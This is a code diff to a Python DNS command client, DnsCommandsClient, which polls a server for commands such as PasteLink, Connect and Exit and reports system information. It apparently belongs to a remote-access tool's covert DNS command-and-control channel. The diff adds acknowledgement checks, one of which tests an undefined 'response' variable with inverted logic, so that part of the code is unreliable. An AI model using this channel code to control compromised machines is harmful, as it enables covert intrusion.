@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+# -*- coding: utf-8 -*-
 
 import struct
 import socket
@@ -175,6 +175,9 @@ class DnsCommandsClient(Thread):
     def process(self):
         commands = list(self._request(Poll()))
     	logging.debug('commands: {}'.format(commands))
+        ack = self._request(Ack(len(commands)))
+        if not ( len(ack) == 1 and isinstance(ack[0], Ack)):
+            logging.error('ACK <-> ACK failed: received: {}'.format(ack))
 
         for command in commands:
             responses = []
@@ -193,7 +196,10 @@ class DnsCommandsClient(Thread):
                     key = self.encoder.process_kex_response(response[0].parcel)
                     self.spi = kex.spi
             elif isinstance(command, Poll):
-                responses = self._request(SystemInfo())
+                ack = self._request(SystemInfo())
+                if not len(response) == 1 and not isinstance(response[0], Ack):
+                    logging.error('SystemInfo: ACK expected but {} found'.format(
+                        response))
             elif isinstance(command, PasteLink):
                 self.on_pastelink(command.url, command.action, self.encoder)
             elif isinstance(command, Connect):
@@ -203,12 +209,8 @@ class DnsCommandsClient(Thread):
             elif isinstance(command, Disconnect):
                 self.on_disconnect()
             elif isinstance(command, Exit):
-                responses = self._request(Exit())
                 self.active = False
                 self.on_exit()
-
-            for command in responses:
-                commands.append(command)
 
     def run(self):
         while True:
